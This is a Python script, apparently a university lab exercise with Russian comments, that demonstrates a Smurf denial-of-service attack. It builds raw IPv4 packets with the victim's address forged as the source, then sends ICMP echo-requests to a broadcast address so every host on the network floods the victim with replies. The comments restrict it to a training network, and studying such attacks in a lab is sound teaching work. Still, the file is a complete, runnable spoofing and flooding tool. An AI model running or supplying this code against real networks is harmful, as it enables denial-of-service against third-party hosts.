"""ЛР №5: демонстрация Smurf-атаки (только для учебной сети!).

В IP-заголовке в качестве адреса источника указывается адрес атакуемого узла,
пакет отправляется на широковещательный адрес сети. Все узлы отвечают echo-reply
на подставленный адрес источника (жертву). Наблюдать на жертве через Wireshark.

Требуется собирать IP-заголовок вручную (IP_HDRINCL) и права root.

Запуск:
    sudo python3 lab5/smurf.py --victim 192.168.1.50 --broadcast 192.168.1.255 --count 20
"""
import argparse
import socket
import struct
import sys

import net


def ip_checksum(header: bytes) -> int:
    """Контрольная сумма IP-заголовка (тот же алгоритм, что и для ICMP)."""
    return net.checksum(header)


def build_ip_header(src: str, dst: str, payload_len: int) -> bytes:
    """Собирает IPv4-заголовок с подставным адресом источника (spoofing)."""
    version_ihl = (4 << 4) | 5
    total_len = 20 + payload_len
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, 0, 0, 64,
        socket.IPPROTO_ICMP, 0,
        socket.inet_aton(src), socket.inet_aton(dst),
    )
    chk = ip_checksum(header)
    return struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl, 0, total_len, 0, 0, 64,
        socket.IPPROTO_ICMP, chk,
        socket.inet_aton(src), socket.inet_aton(dst),
    )


def make_raw_socket() -> socket.socket:
    """Raw-сокет с ручной сборкой IP-заголовка и разрешённым broadcast."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    return sock


def smurf(victim: str, broadcast: str, count: int) -> None:
    """Шлёт спуфленные echo-request на broadcast от имени жертвы."""
    sock = make_raw_socket()
    icmp = net.build_echo_request(ident=0x1234, seq=1)
    ip_header = build_ip_header(src=victim, dst=broadcast, payload_len=len(icmp))
    packet = ip_header + icmp
    for i in range(count):
        sock.sendto(packet, (broadcast, 0))
        print(f"[{i + 1}/{count}] отправлен spoofed echo-request {victim} -> {broadcast}")
    sock.close()


def build_parser() -> argparse.ArgumentParser:
    """Разбор аргументов."""
    p = argparse.ArgumentParser(description="Демонстрация Smurf-атаки (ЛР5)")
    p.add_argument("--victim", required=True, help="адрес жертвы (подставной источник)")
    p.add_argument("--broadcast", required=True, help="широковещательный адрес сети")
    p.add_argument("--count", type=int, default=10, help="число пакетов")
    return p


def main(argv=None) -> int:
    """Точка входа."""
    args = build_parser().parse_args(argv)
    try:
        smurf(args.victim, args.broadcast, args.count)
    except PermissionError:
        print("Нужны права root: запустите через sudo.", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
